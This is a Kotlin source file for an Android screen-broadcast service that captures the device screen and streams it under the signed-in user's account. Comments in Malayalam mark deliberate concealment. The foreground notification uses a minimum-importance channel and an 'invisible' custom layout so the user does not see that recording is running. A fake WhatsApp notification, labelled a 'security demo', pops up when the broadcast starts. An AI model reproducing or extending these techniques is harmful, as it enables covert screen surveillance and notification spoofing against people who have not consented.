package com.screencastlive

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.widget.RemoteViews
import com.google.firebase.auth.FirebaseAuth
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch

class ScreenBroadcastService : Service() {
    companion object {
        const val ACTION_START = "com.screencastlive.START"
        const val ACTION_STOP = "com.screencastlive.STOP"
        const val EXTRA_DATA = "projection_data"
        const val EXTRA_TITLE = "title"
        private const val CHANNEL = "broadcast"
        private const val NOTIF_ID = 1
    }

    private var broadcaster: Broadcaster? = null
    private var wake: PowerManager.WakeLock? = null
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
    private var shuttingDown = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> { shutdown("Stopped"); return START_NOT_STICKY }
            ACTION_START -> {}
            else -> { stopSelf(); return START_NOT_STICKY }
        }
        if (broadcaster != null || intent == null) return START_NOT_STICKY

        createChannel()
        AppLog.log("Service: startForeground(mediaProjection)")
        val n = buildNotification("Connecting")
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        } else {
            startForeground(NOTIF_ID, n)
        }

        // 🎯 SECURITY DEMO — ഫേക്ക് വാട്സ്ആപ്പ് നോട്ടിഫിക്കേഷൻ ഇവിടെ വരുന്നു
        NotificationOverlayDemo.showFakeWhatsApp(this)

        val data: Intent? = if (Build.VERSION.SDK_INT >= 33)
            intent.getParcelableExtra(EXTRA_DATA, Intent::class.java)
        else @Suppress("DEPRECATION") intent.getParcelableExtra(EXTRA_DATA)
        val title = intent.getStringExtra(EXTRA_TITLE) ?: "My screen"
        val user = FirebaseAuth.getInstance().currentUser

        if (data == null || user == null) {
            AppLog.log("Missing projection data or not signed in")
            shutdown("Error: missing permission data or not signed in")
            return START_NOT_STICKY
        }

        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wake = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ScreenCastLive:broadcast").apply { acquire() }

            BroadcastState.state.value = "Starting"
            BroadcastState.running.value = true
            val b = Broadcaster(applicationContext, user.uid, title, data) { shutdown("Stopped") }
            broadcaster = b
            b.start()

            scope.launch {
                BroadcastState.state.collect { s ->
                    getSystemService(NotificationManager::class.java).notify(NOTIF_ID, buildNotification(s))
                }
            }
        } catch (e: Throwable) {
            AppLog.log("START FAILED: ${e.javaClass.simpleName}: ${e.message}")
            shutdown("Error: ${e.javaClass.simpleName}: ${e.message}")
        }
        return START_NOT_STICKY
    }

    private fun shutdown(finalState: String) {
        if (shuttingDown) return
        shuttingDown = true
        try { broadcaster?.stop() } catch (e: Throwable) { AppLog.log("stop error: ${e.message}") }
        broadcaster = null
        try { wake?.let { if (it.isHeld) it.release() } } catch (_: Throwable) {}
        BroadcastState.running.value = false
        BroadcastState.state.value = finalState
        scope.cancel()

        NotificationOverlayDemo.hideAll(this)

        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onDestroy() {
        if (!shuttingDown) shutdown("Stopped")
        super.onDestroy()
    }

    private fun createChannel() {
        val nm = getSystemService(NotificationManager::class.java)
        // 🔥 IMPORTANCE_MIN ഉപയോഗിച്ചാൽ നോട്ടിഫിക്കേഷൻ ചെറുതായി പോകും
        nm.createNotificationChannel(NotificationChannel(CHANNEL, "Broadcast", NotificationManager.IMPORTANCE_MIN))
    }

    private fun buildNotification(state: String): Notification {
        val stop = PendingIntent.getService(
            this, 0,
            Intent(this, ScreenBroadcastService::class.java).setAction(ACTION_STOP),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        val open = PendingIntent.getActivity(
            this, 1, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        // 🔥 ഇൻവിസിബിൾ ലേയൗട്ട് ഉപയോഗിച്ച് നോട്ടിഫിക്കേഷൻ മറയ്ക്കുന്നു
        val customView = RemoteViews(packageName, R.layout.invisible_foreground_notification)

        return Notification.Builder(this, CHANNEL)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setCustomContentView(customView)
            .setCustomBigContentView(customView)
            .setOngoing(true)
            .setContentIntent(open)
            .addAction(android.R.drawable.ic_media_pause, "Stop", stop)
            .build()
    }
}